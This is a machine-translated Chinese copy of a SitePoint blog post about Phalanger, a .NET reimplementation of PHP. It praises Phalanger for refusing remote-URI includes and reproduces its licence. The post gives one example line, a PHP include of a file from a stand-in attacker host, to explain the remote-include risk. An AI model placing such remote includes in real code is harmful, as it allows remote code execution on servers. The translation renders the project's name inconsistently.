# 长枪党——比真品好？

> 原文：<https://www.sitepoint.com/phalanger-better-than-the-real-thing/>

我之前提到过[Phalanger](https://www.sitepoint.com/php-sharp/)——PHP for . net 的完全重新实现。自那以后，它已经走过了漫长的道路，他们上个月发布了 1.0 版 RC2，并发布了一份变更日志，表明他们已经涵盖了常见用例，并正在转向“最好有”的边缘用例。他们还[报道了在 Phalanger 下成功运行 phpMyAdmin、phpBB2 和 PHP-Nuke 的情况。](http://www.php-compiler.net/Samples.php)

无论如何，当[阅读《如何包括工作》时，有一段引人注目；](http://www.php-compiler.net/Documentation/Snippets.htm#Inclusions)

> 在 PHP 中，可以使用物理路径或 URIs 来指定包含的目标文件。URI 必须从模式规范(http://、ftp://、file://等)开始。)将它与物理路径分开。在当前版本中，**长枪党不支持 URIs 加入。URIs 只在像 fopen()** 这样的文件系统函数中受支持。

这里有什么好玩的？简而言之，*fa Langer 在这里实现了一个比真正的 PHP* 更好/更聪明的安全策略，不管是有意还是无意。

有了长枪党你仍然可以做。

```
file_get_contents('http://example.com');
```

…没有风险；

```
include 'http://evilhacker.net/somephp.txt';
```

同时，对于真正的 PHP(据我所知，甚至是最新版本)，你可以两者都有，也可以都没有——前者是一个有用的特性，而后者实际上没有合法用途，但会带来巨大的安全风险。

更多细节，这个问题在 2004 年 4 月 1 日[的讨论中出现](https://www.sitepoint.com/php-virus-attacking-web-hosts/)和[西蒙的评论](https://www.sitepoint.com/php-virus-attacking-web-hosts/#comment-167)很好地总结了意义，而更多细节在[这个评论](https://www.sitepoint.com/php-virus-attacking-web-hosts/#comment-164)中，它链接回西蒙的一个旧博客条目。[乔治](http://www.schlossnagle.org/~george/blog/index.php?/archives/27-Why-register_globals-and-remote-includes-are-a-serious-problem-in-PHP.html)之前也解释过这个。

总之，这一切让我想到了“如果呢？”。如果长枪党的目标不仅仅是和 PHP 持平，而是目标更高呢？在某种程度上，也许它已经存在了。

首先，考虑一下编写扩展需要什么。也许最好的说明就是这个变更日志。并比较[的来源](http://cvs.php.net/co.php/php-src/ext/standard/array.c?r=1.308.2.12)和它的对等物[这里](http://atrey.karlin.mff.cuni.cz/~matousek/Download/RC2/ClassLibrarySource.zip) (ZIP)。你更愿意用 C(加上学习 API 的[)还是 C#来编写扩展？你认为哪个会导致更少的错误/更快的开发？](http://www.php.net/manual/en/zend.php)[伊恩·比克](http://blog.ianbicking.org/)在这里提出了观点[。](https://www.sitepoint.com/php-sharp/#comment-1617)

与此同时，方阵[基准](http://php-compiler.net/Benchmarks.htm)可能会引起一些人的惊讶。

在我看来，长枪党的主要问题是接受。

目前，它仍然是一个 Windows 专用的解决方案，这将使许多人感到厌烦。他们在 [FAQ](http://php-compiler.net/FAQ.htm) 中讨论 Mono，这样也许有一天会改变。托管代码问题(Phalanger 以这种方式支持现有的 PHP 扩展)可以通过一个足够大的社区来解决，这个社区愿意用 C#重新实现。此外，就接受度而言，单声道看起来也不怎么样——Novell 似乎在方向盘上睡着了。

另一个障碍是[的作者](http://php-compiler.net/Authors.php)并没有真正对长枪党开放(就像在开源中一样)。是的，函数实现是开放的，但是真正的核心(PHP 解析器/运行时)受到限制性许可证的保护。同时，公共 subversion / cvs / whatever 存储库在哪里？如果你经营一家小型开发店，这些是[掌握自己命运的关键问题。与此同时，开放对于吸引贡献开发者的社区是至关重要的。顺便说一句，这并不意味着指责——我肯定已经花了很多时间，如果你考虑 Zend 花了多长时间才达到现在的位置，你可能会重新考虑免费提供这些时间。也许希望是](http://simon.incutio.com/archive/2005/11/01/destiny)[有人](http://www.microsoft.com)会从他们那里买下它，不幸的是，有人现在似乎不太关注真正的机会，尽管[这个](http://news.com.com/Microsoft+looks+to+extinguish+LAMP/2100-1012_3-5746549.html)。

否则，也许有一些基本的东西阻碍了像法兰格这样的项目成为“失败者”？考虑到 [IronPython](http://www.ironpython.com/) 和 [jython](http://www.jython.org/) ，他们似乎都对[这个真实的东西](http://www.python.org)没有多少热情。

也就是说，如果长枪党被接受，并以某种方式开始出现在每月 5 美元的共享主机上，你会使用它吗？如果长枪党在真正的东西之前实现了名称空间之类的东西，那会对你有吸引力吗？

如果你对这两个问题中的任何一个回答是肯定的，那么今天 PHP 的现状看起来会非常不同。

你必须同意使用长枪党的许可证。

> 定义
> 
> 在本文中，“作者”指的是由 Jan Benda、Martin Maly、Tomas Matousek、帕维尔·诺瓦克、Vaclav Novak 和 Ladislav Prosek 组成的长枪党团队。“软件”指的是 Phalanger–PHP 语言编译器。NET Framework 由作者开发的 1.0 版。该软件的最新版本以及许可证可以在 http://www.php-compiler.net 网站上找到。
> 
> 本许可证管理随附软件的使用，您使用本软件即表示接受本许可证。
> 
> 许可授予和限制
> 
> 您可以将本软件用于任何非商业或商业目的，但须遵守本许可证中的限制。
> 
> 您不得修改该软件。特别是，您不能修改同样以源代码形式发布的类库。
> 
> 尽管有此限制，您不得对软件进行反向工程、反编译或反汇编，除非且仅在适用法律明确允许的范围内。
> 
> 您可以出于非商业或商业目的扩展本软件并分发扩展，但是您不得授予比本许可证所提供的范围更广的软件或扩展的权利。例如，您不得根据允许修改、逆向工程、反编译或反汇编软件的条款，或根据声称要求将软件或扩展再许可给他人的条款，分发软件的扩展。
> 
> 如果您扩展了软件或创建了衍生作品，并分发此类扩展或衍生作品，您将导致文件带有显著的声明，以便接收人知道他们没有收到原始软件。此类通知必须声明:(I)您已经扩展了软件；以及(ii)明确界定您的扩展。
> 
> 我们还要求您同意不从软件中删除任何版权或其他声明。如果您分发软件，您必须包含本许可证的一份完整副本。
> 
> 作者保留本许可证未明确授予的所有权利。
> 
> 结束
> 
> 如果您以任何方式违反本许可证，您在本许可证下的权利将自动终止。
> 
> 责任限制
> 
> 该软件“按原样”提供，没有任何担保。这意味着没有明示、暗示或法定的保证，包括但不限于适销性或特定用途适用性的保证，或任何所有权或非侵权的保证。
> 
> 在法律允许的最大范围内，作者不对与软件或本许可证相关的任何损害负责，包括直接、间接、特殊、后果性或附带损害，无论其基于何种法律理论。

## 分享这篇文章